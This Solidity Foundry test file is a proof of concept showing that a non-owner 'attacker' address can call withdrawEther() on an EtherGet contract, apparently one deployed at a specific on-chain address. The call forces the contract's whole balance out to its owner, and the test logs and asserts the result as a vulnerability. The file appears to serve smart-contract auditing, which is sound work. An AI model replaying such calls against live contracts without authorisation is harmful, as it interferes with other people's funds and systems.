// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import {Test, console} from "forge-std/Test.sol";
import "../src/0x52d2e0f9b01101a59b38a3d05c80b7618aeed984.sol";

contract EtherGetTest is Test {
    EtherGet public etherGet;
    address public owner;
    address public attacker;

    function setUp() public {
        owner = makeAddr("owner");
        attacker = makeAddr("attacker");
        
        // Deploy contract as owner
        vm.prank(owner);
        etherGet = new EtherGet();
        
        // Fund the contract with 1 ether
        vm.deal(address(etherGet), 1 ether);
    }

    function testUnrestrictedEtherWithdrawal() public {
        // Record initial balances
        uint256 contractBalanceBefore = address(etherGet).balance;
        uint256 ownerBalanceBefore = owner.balance;
        
        console.log("--- BEFORE-Trigger WithdrawEther ---");
        console.log("Contract ETH balance:", contractBalanceBefore);
        console.log("Owner ETH balance:", ownerBalanceBefore);
        
        console.log("--- Trigger WithdrawEther (called by attacker) ---");
        // Attacker (non-owner) withdraws contract funds
        vm.prank(attacker);
        etherGet.withdrawEther();
        
        // Record state after withdrawal
        uint256 contractBalanceAfter = address(etherGet).balance;
        uint256 ownerBalanceAfter = owner.balance;
        
        console.log("--- AFTER-Trigger WithdrawEther ---");
        console.log("Contract ETH balance:", contractBalanceAfter);
        console.log("Owner ETH balance:", ownerBalanceAfter);
        
        // Calculate balance changes
        uint256 contractBalanceChange = contractBalanceBefore - contractBalanceAfter;
        uint256 ownerBalanceChange = ownerBalanceAfter - ownerBalanceBefore;
        bool balanceChanged = contractBalanceChange > 0 && ownerBalanceChange > 0;
        bool fundsTransferredCorrectly = ownerBalanceChange == contractBalanceChange;
        bool vulnerabilityExists = balanceChanged && fundsTransferredCorrectly;
        
        console.log("Contract balance change:", contractBalanceChange);
        console.log("Owner balance change:", ownerBalanceChange);
        console.log("Funds transferred to owner correctly:", fundsTransferredCorrectly ? "YES" : "NO");
        
        // Final vulnerability verdict
        if (vulnerabilityExists) {
            console.log("Vulnerability Exists: Non-owner successfully withdrew contract funds and transferred to owner");
        } else {
            console.log("Vulnerability not Exist: Non-owner withdrawal did not correctly transfer funds to owner");
        }
        
        // Assert failure if vulnerability wasn't demonstrated
        assertTrue(
            vulnerabilityExists, 
            "Non-owner should be able to withdraw funds to owner"
        );
    }
}